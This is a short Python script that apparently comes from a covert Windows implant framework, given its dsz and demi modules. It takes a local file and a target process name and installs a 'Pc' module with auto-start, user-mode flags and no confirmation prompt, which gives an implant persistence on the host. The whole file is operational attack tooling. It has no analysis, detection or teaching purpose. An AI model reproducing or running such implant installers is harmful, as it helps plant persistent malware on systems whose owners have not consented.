
import dsz
import dsz.file
import dsz.lp
import dsz.menu
import dsz.payload
import dsz.process
import dsz.version
import pc2_2

dsz.lp.AddResDirToPath("DeMi")

import demi
import demi.registry
import demi.windows.module

import glob
import os
import re
import shutil
import sys


#------------------------------------------------------------------------------------------
def main(argv):
	dsz.control.echo.Off()
	
	if (len(argv) != 3):
		dsz.ui.Echo("* Invalid parameters", dsz.ERROR)
		dsz.ui.Echo()
		dsz.ui.Echo("Usage:  %s <localFile> <procName>" % (argv[0]))
		return False

	localFile = argv[1].strip('"')
	procName = argv[2].strip('"')
	
	#return demi.windows.module.Install("Pc", localFile, demi.registry.PC.Name, demi.registry.PC.Id, 1, "Auto_Start|User_Mode", procName, ask=False)
	return demi.windows.module.Install("Pc", localFile, "", demi.registry.PC.Id, 1, "Auto_Start|User_Mode", procName, ask=False)
	


#------------------------------------------------------------------------------------------
if __name__ == '__main__':
	if (main(sys.argv) != True):
		sys.exit(-1);